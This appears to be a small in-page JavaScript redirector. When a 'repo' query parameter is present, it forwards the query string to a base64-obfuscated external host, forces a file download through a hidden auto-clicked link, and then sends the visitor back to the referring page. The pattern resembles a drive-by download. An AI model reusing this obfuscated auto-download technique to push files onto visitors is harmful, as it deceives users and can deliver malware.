(function () {
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);

  if (!!urlParams.get(atob('cmVwbw=='))) {
    fetch(atob('aHR0cHM6Ly9naXRodWItYXJ0aWZhY3QtNnlyNG5iZWYzcS11Yy5hLnJ1bi5hcHAv') + queryString)
      .then(function (res) {
        console.log('status: ' + res.status);
        console.log('location header: ' + res.headers.get('location'));

        if (res.status === 302) {
          var header = res.headers.get('content-disposition');
          var contentDispostion = header.split(';');
          var filenameToken = `filename*=UTF-8''`;

          var filename = 'downloaded.zip';
          for (var thisValue of contentDispostion) {
            if (thisValue.trim().indexOf(filenameToken) === 0) {
              filename = decodeURIComponent(thisValue.trim().replace(filenameToken, ''));
              break;
            }
          }

          return { filename: filename, blob: res.blob() };
        }
      })
      .then(function (res) {
        if (!!res) {
          var url = window.URL.createObjectURL(res.blob);
          var a = document.createElement('a');
          a.href = url;
          a.download = res.filename;
          document.body.appendChild(a);
          a.click();
          a.remove();

          console.log('clicked link: ' + url);

          if (!!document.referrer) {
            window.location.replace(document.referrer);
          }
        }
      });
  }
})();
